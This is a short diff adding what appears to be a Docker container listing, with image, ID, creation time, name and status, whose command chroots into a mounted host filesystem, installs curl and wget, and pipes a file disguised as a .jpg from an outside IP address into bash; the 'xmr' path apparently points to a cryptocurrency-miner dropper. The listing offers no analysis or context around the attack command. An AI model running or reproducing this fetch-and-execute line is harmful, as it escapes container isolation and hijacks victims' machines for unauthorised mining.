@@ -1,0 +1,13 @@
+Image: ubuntu
+ID: 893696f3d54c81065015f86edfe037606a3b5321a5b3c638973f46ccac4c9b30
+Command:
+ chroot /mnt sh -c 'apt-get update;
+ apt-get install -y wget curl bash;
+ yum install -y wget curl bash;
+ curl http://129.211.98.236/xmr/mo/mo.jpg
+ | bash'
+
+Created:1596620273
+Names:
+/hardcore_goodall
+Status: Up 5 days
